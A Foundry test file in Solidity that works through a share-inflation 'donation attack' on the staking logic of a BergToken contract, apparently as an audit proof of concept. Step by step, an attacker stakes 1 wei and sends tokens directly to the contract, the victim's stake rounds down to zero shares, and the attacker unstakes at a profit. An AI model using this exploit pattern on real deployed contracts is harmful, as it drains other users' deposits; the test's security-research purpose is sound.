// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/BergToken.sol"; // Adjust path if your contract is in a different location

contract DonationAttackTest is Test {
    BergToken public bergToken;

    address public deployer = makeAddr("deployer");
    address public attacker = makeAddr("attacker");
    address public victim = makeAddr("victim");

    uint256 public constant INITIAL_MINT_AMOUNT = 10_000 ether; // Using 'ether' for 18 decimal places

    function setUp() public {
        // Set up the deployer as msg.sender for contract deployment
        vm.startPrank(deployer);
        bergToken = new BergToken();
        vm.stopPrank();

        // Mint tokens to attacker and victim
        vm.startPrank(deployer);
        bergToken.mint(attacker, INITIAL_MINT_AMOUNT);
        bergToken.mint(victim, INITIAL_MINT_AMOUNT);
        vm.stopPrank();

        // Verify initial balances
        assertEq(bergToken.balances(attacker), INITIAL_MINT_AMOUNT, "Attacker should have initial tokens");
        assertEq(bergToken.balances(victim), INITIAL_MINT_AMOUNT, "Victim should have initial tokens");
    }

    function testDonationAttack() public {
        uint256 attackerInitialBalance = bergToken.balances(attacker);
        uint256 victimInitialBalance = bergToken.balances(victim);

        // --- Step 1: Attacker stakes a very small amount (1 wei) to initialize the pool ---
        // This sets totalStakedShares and totalStakedBERG to 1, establishing a 1:1 ratio.
        // Using 1 wei ensures that subsequent integer division is more likely to result in 0.
        vm.startPrank(attacker);
        uint256 attackerFirstStake = 1; // Stake 1 wei (smallest unit)
        bergToken.stake(attackerFirstStake);
        vm.stopPrank();

        console.log("--- After Attacker's First Stake ---");
        console.log("Attacker's staking shares:          %s", bergToken.stakingShares(attacker));
        console.log("Total staking shares:               %s", bergToken.totalStakingShares());
        console.log("Contract BERG balance:              %s", bergToken.balances(address(bergToken)));
        console.log("------------------------------------");

        assertEq(bergToken.stakingShares(attacker), attackerFirstStake, "Attacker should have 1 share");
        assertEq(bergToken.totalStakingShares(), attackerFirstStake, "Total shares should be 1");
        assertEq(bergToken.balances(address(bergToken)), attackerFirstStake, "Contract balance should be 1");

        // --- Step 2: Attacker sends a large amount of BERG directly to the contract ---
        // This increases the contract's BERG balance (totalStakedBERG) without increasing totalStakedShares,
        // thus manipulating the share price ratio (totalStakedShares / totalStakedBERG) to be very small.
        vm.startPrank(attacker);
        uint256 attackerDirectTransfer = 1000 ether; // Send 1000 BERG directly
        bergToken.transfer(address(bergToken), attackerDirectTransfer);
        vm.stopPrank();

        console.log("--- After Attacker's Direct Transfer to Contract ---");
        console.log("Attacker's staking shares:          %s", bergToken.stakingShares(attacker)); // Still 1
        console.log("Total staking shares:               %s", bergToken.totalStakingShares()); // Still 1
        console.log("Contract BERG balance:              %s", bergToken.balances(address(bergToken))); // Now 1 + 1000 ether
        console.log("----------------------------------------------------");

        assertEq(bergToken.balances(address(bergToken)), attackerFirstStake + attackerDirectTransfer, "Contract balance should include direct transfer");
        assertEq(bergToken.totalStakingShares(), attackerFirstStake, "Total shares should remain unchanged by direct transfer");

        // --- Step 3: Victim stakes a significant amount ---
        // Due to the manipulated ratio, the victim will now receive 0 shares because of integer division.
        vm.startPrank(victim);
        uint256 victimStakeAmount = 100 ether; // Victim stakes 100 BERG
        bergToken.stake(victimStakeAmount);
        vm.stopPrank();

        console.log("--- After Victim's Stake ---");
        console.log("Victim's staking shares:            %s", bergToken.stakingShares(victim)); // Expected: 0
        console.log("Total staking Shares:               %s", bergToken.totalStakingShares()); // Still 1 (attacker's shares)
        console.log("Contract BERG balance:              %s", bergToken.balances(address(bergToken))); // 1 + 1000 ether + 100 ether
        console.log("----------------------------");

        // Assert that the victim received 0 shares due to the loss of precision
        assertEq(bergToken.stakingShares(victim), 0, "Victim should have received 0 shares due to precision loss");
        // The totalStakedShares should still be just the attacker's initial 1 share
        assertEq(bergToken.totalStakingShares(), attackerFirstStake, "Total shares should not increase from victim's stake");
        // Contract balance should reflect victim's stake
        assertEq(bergToken.balances(address(bergToken)), attackerFirstStake + attackerDirectTransfer + victimStakeAmount, "Contract balance should include victim's stake");


        // --- Step 4: Attacker unstakes their shares ---
        // The attacker's single share now represents a much larger portion of the total BERG in the contract
        // because the victim's BERG was added to the pool without corresponding shares.
        vm.startPrank(attacker);
        uint256 attackerBalanceBeforeUnstake = bergToken.balances(attacker);
        uint256 attackerSharesToUnstake = bergToken.stakingShares(attacker); // This should be 1 wei

        bergToken.unstake(attackerSharesToUnstake);
        vm.stopPrank();

        uint256 attackerBalanceAfterUnstake = bergToken.balances(attacker);
        uint256 netGain = attackerBalanceAfterUnstake - attackerInitialBalance;

        console.log("--- After Attacker Unstakes ---");
        console.log("Attacker's initial balance:         %s", attackerInitialBalance);
        console.log("Attacker's balance after unstake:   %s", attackerBalanceAfterUnstake);
        console.log("Attacker's net gain:                %s", netGain);
        console.log("-------------------------------");
    }
}
